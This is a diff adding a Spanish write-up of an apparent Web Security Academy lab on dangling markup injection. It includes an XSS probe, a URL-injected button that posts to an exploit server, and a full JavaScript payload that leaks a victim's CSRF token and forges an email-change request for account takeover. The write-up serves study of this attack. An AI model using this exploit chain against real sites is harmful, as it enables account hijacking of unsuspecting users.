@@ -165,4 +165,55 @@ body:username.value+':'+this.value
 
 # Dangling markup injection 
 
+Verificando la funcioalidad del cambio de correo, vemos que el correo que ponemos se relfeja en la web. Cuando intentamos inyectar un XSS como nuevo email utilizando `test@example.com"><img src=1 onerror=alert(1)>`vemos que si bien logramos inyectar el código este no se interpreta, ya que se escapa bien y la web cuenta con CSP. 
 
+Como siguiente validación vemos que podemos poner el valor del formulario mediante la URL de siguiente manera: `https://0a7200dd03c2487f80280d6c00e20099.web-security-academy.net/my-account?email=foo@example.com`
+
+Verificando el CSP vemos que no se definio la directiva `form-action` significando que podemos enviar un formulario a otra web. 
+
+Ya que también podemos inyectar codigo html lanzamos la siguiente petición: `https://0a7200dd03c2487f80280d6c00e20099.web-security-academy.net/my-account?email=foo@example.com"><button formaction="https://exploit-0afb00c403c3485580aa0ce801e30075.exploit-server.net/exploit">Click me</button>`
+
+Esto hara que nos aparezac un boton con el texto "Click me" y una vez lo clickeamos nos lleva a nuestro sitio malicioso. 
+
+Para ello creamos el siguiente payload y se lo enviamos a la victima: 
+```html
+<body>
+<script>
+// Define las URLs del entorno del laboratorio y del servidor de exploits.
+const academyFrontend = "https://0a7200dd03c2487f80280d6c00e20099.web-security-academy.net/"; 
+const exploitServer = "https://exploit-0afb00c403c3485580aa0ce801e30075.exploit-server.net/exploit";
+
+// Extrae el token CSRF de la URL.
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+// Verifica si se encontró un token CSRF.
+if (csrf) {
+    // Si el token está presente, crea dinámicamente los elementos de formulario para realizar el ataque.
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    // Configura el nombre y valor del token CSRF.l.
+    email.name = 'email';
+    token.name = 'csrf';
+    token.value = csrf;
+
+    // Configura el nuevo email que reemplazará al actua
+    email.value = 'hacker@evil-user.net';
+
+    // Configura el formulario, lo añade al documento y lo evía automáticamente.
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+
+} else {
+    // Si no hay token, redirige al usuario a una URL manipulada para generar el botón que expone el token mediante GET.
+    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+</body>
+```
